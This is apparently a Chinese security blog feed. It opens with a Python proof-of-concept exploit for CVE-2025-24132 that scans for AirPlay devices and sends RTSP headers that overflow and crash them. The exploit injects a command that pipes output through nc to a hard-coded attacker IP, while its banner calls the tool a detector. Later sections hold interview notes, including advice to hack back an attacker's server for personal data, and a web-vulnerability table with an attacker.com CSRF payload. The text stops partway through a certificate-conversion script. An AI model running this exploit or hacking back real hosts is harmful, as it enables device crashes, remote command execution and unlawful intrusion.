 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">A PoC script for CVE-2025-24132 is made by shaoxinSEC 25/11/2025.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> ifaddr</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys, socket, time, ipaddress</span><br><span class="line"><span class="keyword">from</span> zeroconf <span class="keyword">import</span> Zeroconf, ServiceBrowser, ServiceInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- 配置 ----------</span></span><br><span class="line">OVERFLOW_SIZES = [<span class="number">0x1200</span>, <span class="number">0x2000</span>]   <span class="comment"># 4608 &amp; 8192</span></span><br><span class="line">LISTEN_ADDR = <span class="string">&quot;172.20.10.6&quot;</span>         <span class="comment"># 攻击机IP（尝试nc外带命令）</span></span><br><span class="line">LISTEN_PORT    = <span class="number">4445</span>               <span class="comment"># 攻击机PORT</span></span><br><span class="line">TIMEOUT        = <span class="number">3</span></span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"></span><br><span class="line">airplay_devices = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AirPlayListener</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        info = zc.get_service_info(type_, name)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            addr  = socket.inet_ntoa(info.addresses[<span class="number">0</span>])</span><br><span class="line">            port  = info.port</span><br><span class="line">            props = &#123;k.decode().lower(): v.decode() <span class="keyword">for</span> k, v <span class="keyword">in</span> info.properties.items()&#125;</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: addr,</span><br><span class="line">                <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: props.get(<span class="string">&#x27;model&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: props.get(<span class="string">&#x27;features&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port</span>(<span class="params">ip, port, timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.settimeout(timeout)</span><br><span class="line">        <span class="keyword">return</span> s.connect_ex((ip, port)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crash_target</span>(<span class="params">ip, port, size</span>):</span><br><span class="line">    cmd  = <span class="string">f&quot;echo CVE-2025-24132|nc <span class="subst">&#123;LISTEN_ADDR&#125;</span> <span class="subst">&#123;LISTEN_PORT&#125;</span>\n&quot;</span></span><br><span class="line">    pkt = (</span><br><span class="line">        <span class="string">f&quot;SETUP rtsp://<span class="subst">&#123;ip&#125;</span>/airplay RTSP/1.0\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;CSeq: 1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Session-ID: <span class="subst">&#123;<span class="string">&#x27;A&#x27;</span>*size&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Authorization: Basic <span class="subst">&#123;<span class="string">&#x27;B&#x27;</span>*<span class="number">0x400</span>&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;User-Agent: AirPlay/310.17 &quot;</span> + cmd + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line">    ).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">            s.settimeout(TIMEOUT)</span><br><span class="line">            s.connect((ip, port))</span><br><span class="line">            s.send(pkt)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heur_vuln</span>(<span class="params">model, features</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;旧model或低特征位 =&gt; 可能旧SDK&quot;&quot;&quot;</span></span><br><span class="line">    vuln_models = [<span class="string">&#x27;AppleTV2,1&#x27;</span>, <span class="string">&#x27;AirPort10,115&#x27;</span>, <span class="string">&#x27;CarPlay1,1&#x27;</span>, <span class="string">&#x27;Audio2,1&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(m <span class="keyword">in</span> model <span class="keyword">for</span> m <span class="keyword">in</span> vuln_models): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(features, <span class="number">16</span>) &amp; <span class="number">0xFF</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_ipv4_interfaces</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用本机所有的IPv4网络接口&quot;&quot;&quot;</span></span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> adapter <span class="keyword">in</span> ifaddr.get_adapters():</span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> adapter.ips:</span><br><span class="line">            <span class="keyword">if</span> ip.is_IPv4 <span class="keyword">and</span> <span class="keyword">not</span> ip.ip.startswith(<span class="string">&#x27;127.&#x27;</span>):</span><br><span class="line">                addrs.append(ip.ip)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(addrs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_airplay_info</span>(<span class="params">ip: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">7000</span>, timeout: <span class="built_in">float</span> = <span class="number">2.0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;先PTR扫实例名，再拿TXT，解决硬编码名字对不上的问题&quot;&quot;&quot;</span></span><br><span class="line">    zc = Zeroconf()</span><br><span class="line">    found = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 被动监听2秒，把同一IP的任何 *_airplay._tcp记录都拿到</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Snatcher</span>:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">                info = zc.get_service_info(type_, name)</span><br><span class="line">                <span class="keyword">if</span> info <span class="keyword">and</span> socket.inet_ntoa(info.addresses[<span class="number">0</span>]) == ip <span class="keyword">and</span> info.port == port:</span><br><span class="line">                    <span class="keyword">nonlocal</span> found</span><br><span class="line">                    found = info</span><br><span class="line">            remove_service = update_service = <span class="keyword">lambda</span> *_: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        browser = ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, Snatcher())</span><br><span class="line">        time.sleep(timeout)</span><br><span class="line">        browser.cancel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: found.name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: found.properties.get(<span class="string">b&#x27;model&#x27;</span>, <span class="string">b&#x27;Unknown&#x27;</span>).decode(),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: <span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(found.properties.get(<span class="string">b&#x27;features&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>), <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        zc.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:                 <span class="comment"># 指定单个目标</span></span><br><span class="line">        ip, port = sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">7000</span></span><br><span class="line">        info = query_airplay_info(ip, port)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            airplay_devices.append(&#123;**info, <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Manual-Target&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;Unknown&#x27;</span>, <span class="string">&#x27;features&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">else</span>:                                 <span class="comment"># 监听所有网络接口</span></span><br><span class="line">        interfaces = get_all_ipv4_interfaces()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 将在以下接口监听mDNS：&quot;</span>, interfaces)</span><br><span class="line">        zc = Zeroconf(interfaces=interfaces)</span><br><span class="line">        ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, AirPlayListener())</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        zc.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> airplay_devices:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 未发现任何AirPlay设备&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dev <span class="keyword">in</span> airplay_devices:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 设备<span class="subst">&#123;dev[<span class="string">&#x27;name&#x27;</span>]&#125;</span>  <span class="subst">&#123;dev[<span class="string">&#x27;ip&#x27;</span>]&#125;</span>:<span class="subst">&#123;dev[<span class="string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    model=<span class="subst">&#123;dev[<span class="string">&#x27;model&#x27;</span>]&#125;</span>  features=0x<span class="subst">&#123;dev[<span class="string">&#x27;features&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] 端口不通，跳过&quot;</span>); <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> heur_vuln(dev[<span class="string">&#x27;model&#x27;</span>], dev[<span class="string">&#x27;features&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] 可能使用旧SDK，尝试进行溢出并执行命令&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] 版本特征较新，尝试进行溢出并执行命令&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 本地临时监听回显</span></span><br><span class="line">        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        listener.settimeout(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            listener.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, LISTEN_PORT))</span><br><span class="line">            listener.listen(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            listener = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> sz <span class="keyword">in</span> OVERFLOW_SIZES:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [*] 已发送 <span class="subst">&#123;sz&#125;</span>B 溢出载荷&quot;</span>)</span><br><span class="line">            crash_target(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>], sz)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            still_up = check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> still_up:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [!!!]<span class="subst">&#123;sz&#125;</span>B成功触发崩溃 → 漏洞存在！&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] 漏洞可能已修复&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> listener:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn, _ = listener.accept()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;CVE-2025-24132&quot;</span> <span class="keyword">in</span> conn.recv(<span class="number">128</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;    [!!!] 同时收到命令回显 → 可利用&quot;</span>)</span><br><span class="line">                conn.close()</span><br><span class="line">            <span class="keyword">except</span> socket.timeout: <span class="keyword">pass</span></span><br><span class="line">            listener.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           __                                      __             ______   ________   ______  </span></span><br><span class="line"><span class="string">          /  |                                    /  |           /      \\ /        | /      \\ </span></span><br><span class="line"><span class="string">  _______ $$ |____    ______    ______   __    __ $$/  _______  /$$$$$$  |$$$$$$$$/ /$$$$$$  |</span></span><br><span class="line"><span class="string"> /       |$$      \\  /      \\  /      \\ /  \\  /  |/  |/       \\ $$ \\__$$/ $$ |__    $$ |  $$/ </span></span><br><span class="line"><span class="string">/$$$$$$$/ $$$$$$$  | $$$$$$  |/$$$$$$  |$$  \\/$$/ $$ |$$$$$$$  |$$      \\ $$    |   $$ |      </span></span><br><span class="line"><span class="string">$$      \\ $$ |  $$ | /    $$ |$$ |  $$ | $$  $$&lt;  $$ |$$ |  $$ | $$$$$$  |$$$$$/    $$ |   __ </span></span><br><span class="line"><span class="string"> $$$$$$  |$$ |  $$ |/$$$$$$$ |$$ \\__$$ | /$$$$  \\ $$ |$$ |  $$ |/  \\__$$ |$$ |_____ $$ \\__/  |</span></span><br><span class="line"><span class="string">/     $$/ $$ |  $$ |$$    $$ |$$    $$/ /$$/ $$  |$$ |$$ |  $$ |$$    $$/ $$       |$$    $$/ </span></span><br><span class="line"><span class="string">$$$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/  $$/   $$/ $$/ $$/   $$/  $$$$$$/  $$$$$$$$/  $$$$$$/  </span></span><br><span class="line"><span class="string">                                                                     Detect CVE-2025-24132</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>威胁情报</category>
      </categories>
      <tags>
        <tag>溢出漏洞、RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>红队面试</title>
    <url>/%E5%85%AB%E8%82%A1%E6%96%87.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li><p>常见安全设备之间的区别</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAF：专门对WEB进行防护的应用程序，对http流量进行特征检测，并及时拦截、封禁IP等措施；</span><br><span class="line">防火墙：主要在三层、四层进行过滤，根据规则进行拦截或者放行；</span><br><span class="line">IDS: 对交换机镜像过来的流量进行检测，根据特征进行匹配然后告警，一般旁路部署；</span><br><span class="line">IPS：在检测流量的基础之上，还可以拦截危险的流量，主要部署在出入口的一些地方，形成一条串行链路；</span><br><span class="line">态势感知：整个网络进行的监控，实时汇报攻击源、攻击事件，甚至还可以预测提示下一步的攻击方向，提前防御；</span><br><span class="line">蜜罐：故意部署的带有漏洞的一些系统，主要套取攻击者的一些攻击手法、工具等等，当然了，在一定程度上起到了防御作用；根据交互式程度一般分为低中高三种蜜罐，最常用的开源蜜罐一般是hfishing；</span><br><span class="line">威胁情报：对攻击事件进行的总结，形成的报告，最有意义/最具有代表性的要看里面的IOC（攻击的特征）。来源：微步在线、XXX威胁情报中心，在云沙箱里面运行可以程序，根据特征/IOC进行分析；</span><br><span class="line">EDR：根据特征库、行为对终端进行监控、防护、高危行为的组织。</span><br></pre></td></tr></table></figure>
</li>
<li><p>怎么判断设备是不是误报</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 看来源IP：国内的/国外的、内部来源/外部来源、访问频率、有没有其他攻击行为的记录（安全设备&amp;威胁情报）；</span><br><span class="line">2. 人工分析流量特征：请求里面有没有一些比较敏感的流量特征/敏感的函数名关键字、响应内容是不是包含了敏感信息/命令执行的结果</span><br></pre></td></tr></table></figure>
</li>
<li><p>windows入侵排查</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 恶意账号：net user/net localgroup/注册表找影子账户/在事件管理器的widnows安全日志中，找出登录的用户；</span><br><span class="line">2. netstat -ano获取外部链接ip，然后到威胁情报中心进行判断</span><br><span class="line">3. 启动项排查、计划任务</span><br><span class="line">4. everything查看新增的一些文件，重点筛选exe/vbs/dll，通过云沙箱进行在线判断</span><br><span class="line">5. 日志分析4625找失败的日志、4672管理员登录、4688找新创建的日志</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux入侵排查</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 账号安全：列出所有特权用户、sudo用户、远程登录用户；历史命令，可以在/etc/profile文件中配置记录命令时，同时记录IP地址</span><br><span class="line">2. ss -tulpna找出所有网络连接和对应的进程</span><br><span class="line">3. 启动项排查（/etc/rc.d/rc*.d/）、定时任务（/var/spool/cron/ /etc/crontab）</span><br></pre></td></tr></table></figure>
</li>
<li><p>溯源反制</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 确认攻击事件之后，通过系统日志、网络流量定位到攻击者ip；</span><br><span class="line">2. 通过一些在线网站ip138、站长之家反查域名，尽量找到攻击者的个人信息；</span><br><span class="line">3. 反打攻击者ip，找到vps上遗留的个人数据，查看登录日志，找出上一次的登录ip；</span><br><span class="line">4. 部署蜜罐，套取攻击者的工具信息、字典信息、攻击的目标等攻击手法</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>八股文</tag>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB安全</title>
    <url>/WEB%E5%AE%89%E5%85%A8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<table>
<thead>
<tr>
<th align="left">漏洞</th>
<th align="left">原理</th>
<th align="left">对应功能点</th>
<th align="left">危害 or 利用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SQL 注入</td>
<td align="left">用户输入拼进 SQL，数据库把恶意当指令执行</td>
<td align="left">搜索框、筛选栏（LIKE、IN 语句）<br>登录、密码找回（SELECT WHERE 用户名&#x2F;邮箱）<br>分页、排序（ORDER BY 字段名可用户控制）<br>报表导出、多选删除（id 列表拼接）<br>管理后台“快速 SQL”控制台（最危险）</td>
<td align="left">拖库：下载数据库中的全部数据；<br>篡改：修改管理员密码、写入木马</td>
</tr>
<tr>
<td align="left">XSS</td>
<td align="left">输入被回显成 HTML，浏览器把脚本当页面跑</td>
<td align="left">昵称、留言、评论、私信、商品评价<br>搜索关键词回显（“您搜索的是：xxx”）<br>错误提示、404 页面（把用户路径直接输出）<br>富文本编辑器（过滤不严，可插&lt;svg&#x2F;onload&gt;）<br>配置系统（网站标题、页脚统计代码）</td>
<td align="left">偷Cookie：拿到管理员登录态，不用密码直接进后台<br>网页挂马：访客打开页面自动下载勒索病毒，或者跳转到其他页面</td>
</tr>
<tr>
<td align="left">CSRF</td>
<td align="left">浏览器自动带 Cookie，黑客借受害者身份发请求</td>
<td align="left">修改密码&#x2F;绑定邮箱（缺少旧密码二次校验）<br>后台“一键升级”“重启服务”按钮<br>转账、收货地址修改、隐私设置<br>富文本里嵌入 &lt;img src&#x3D;“&#x2F;&#x2F;attacker.com&#x2F;withdraw?amount&#x3D;100”&gt;<br>RESTful API 仅依赖 Cookie 鉴权，无 Token&#x2F;Origin 校验</td>
<td align="left">用户&#x2F;管理员在登录态下被“偷偷”转账、改配置</td>
</tr>
<tr>
<td align="left">SSRF</td>
<td align="left">服务器替攻击者去访问 URL，暴露内网</td>
<td align="left">图片&#x2F;文章“一键采集”“远程图片加载”<br>WebHook、通知回调配置（让服务端去 POST）<br>在线翻译、PDF 生成、OCR（输入 URL 抓内容）<br>头像“从 URL 上传”<br>云厂商 API 代理（metadata、内网 169.254.169.254）</td>
<td align="left">利用跳板机访问内网其他服务；<br>请求169.254.169.254元数据接口，获取阿里云密钥</td>
</tr>
<tr>
<td align="left">文件上传</td>
<td align="left">只看后缀&#x2F;MIME，未校验内容，可传脚本</td>
<td align="left">头像、相册、工单附件<br>富文本编辑器“本地上传”<br>导入 Excel&#x2F;CSV 做数据迁移<br>插件、主题 ZIP 安装（WordPress 典型）<br>报表模板、证书模板上传</td>
<td align="left">上传一句话木马、拿到 WebShel；<br>挂暗链&#x2F;挖矿：把正常网页替换成菠菜广告或植入 JS 挖矿</td>
</tr>
<tr>
<td align="left">命令执行</td>
<td align="left">输入被拼进系统命令或 eval，服务器直接运行</td>
<td align="left">在线 Ping、Nslookup、traceroute 工具<br>视频&#x2F;音频“转码”后台（ffmpeg 参数拼接）<br>计划任务、远程命令下发（Ansible&#x2F;salt）<br>邮件发送测试（mail()&#x2F;sendmail 拼接）<br>模板引擎（Freemarker、Velocity）渲染用户输入</td>
<td align="left">服务器就是攻击者的肉鸡，想删库就删库；<br>横向打到域控</td>
</tr>
<tr>
<td align="left">反序列化</td>
<td align="left">不可信字节流还原对象时触发魔术方法链</td>
<td align="left">Redis&#x2F;Jackson&#x2F;Fastjson 解析前端 JSON 到对象<br>Dubbo、RMI、SOAP 内部服务通信<br>记住我 Cookie &#x3D; base64(序列化用户对象)<br>消息队列（Kafka、ActiveMQ）消费端<br>缓存“对象”存储（Memcached 存 Java 对象）</td>
<td align="left">只需一个 HTTP 请求，在进程里面直接执行命令，连文件都不留<br>打集群：Java 服务群共用消息队列，一条恶意消息让所有节点同时中招</td>
</tr>
<tr>
<td align="left">越权访问</td>
<td align="left">只按可预测 ID 返回数据，未校验归属</td>
<td align="left">订单、发票、快递单号 ..&#x2F;detail?id&#x3D;10001<br>后台 &#x2F;admin&#x2F;user&#x2F;delete?id&#x3D;123（普通用户也能访问）<br>修改资料时隐藏字段“role&#x3D;admin”<br>团队协作文档 &#x2F;doc&#x2F;read?doc_id&#x3D;xxx<br>API &#x2F;api&#x2F;v1&#x2F;users&#x2F;{uid}&#x2F;wallet 未校验 uid 与 token 一致性</td>
<td align="left">看别人隐私数据：把 URL 里的 id&#x3D;10001 改成 10002，直接看到他人家庭住址、体检报告；<br>刷光平台资金或积分</td>
</tr>
<tr>
<td align="left">XXE</td>
<td align="left">XML 解析器允许外部实体，读文件发请求</td>
<td align="left">老版本 Office&#x2F;ODF 文件上传后服务端解析<br>SOAP、SAML、RSS 订阅解析<br>PDF&#x2F;Word“模板合并”功能（带 XML 数据岛）<br>支付&#x2F;物流接口接收 XML 报文<br>报表设计器导入 .jrxml .xdp 等 XML 模板</td>
<td align="left">任意文件被读出(&#x2F;etc&#x2F;passwd、web.config、私钥)；<br>内网探针：file:&#x2F;&#x2F;192.168.1.10&#x2F;c$&#x2F;test.txt 探测内网存活主机</td>
</tr>
<tr>
<td align="left">逻辑漏洞</td>
<td align="left">业务流程&#x2F;状态机缺校验，可跳过或重复</td>
<td align="left">优惠券&#x2F;红包：先领后用，可负余额、重复核销<br>重置密码：短信验证码在客户端校验，服务端未二次验证<br>订单支付：并发请求生成多笔 0 元单 <br>积分兑换：未校验“兑换数量≤库存”<br>注册：前端 JS 限制用户名长度，后端未限制，导致 admin   空格绕过唯一性</td>
<td align="left">0 元购、重复退款、短信炸弹</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>OWASP TOP10</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>移动安全</title>
    <url>/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><blockquote>
<ol>
<li>导出burp证书 &#x3D;&#x3D;&gt; 转为”hashValue.0”这个文件名 &#x3D;&#x3D;&gt; 移动到安卓系统证书路径中（&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;）</li>
<li>安装代理转发插件：appproxy.apk</li>
<li>安装相关的bp插件：HaE、apiFinder等</li>
</ol>
</blockquote>
<ol>
<li><p>自动转换证书格式并通过adb上传到&#x2F;sdcard&#x2F;download目录下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Android 系统证书转换 &amp; 上传工具</span></span><br><span class="line"><span class="string">支持任意 X.509 证书（DER/PEM/PFX/PEM 内嵌）→ Android 7+ 格式 *.0</span></span><br><span class="line"><span class="string">author : K0u</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AndroidCertConverter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.adb_available = <span class="variable language_">self</span>._check_adb()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- 工具 -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_check_adb</span>(<span class="params">self</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;adb&#x27;</span>, <span class="string">&#x27;version&#x27;</span>], capture_output=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> (subprocess.CalledProcessError, FileNotFoundError):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------- 格式统一 -------------------- #</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ensure_pem</span>(<span class="params">self, cert_path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span 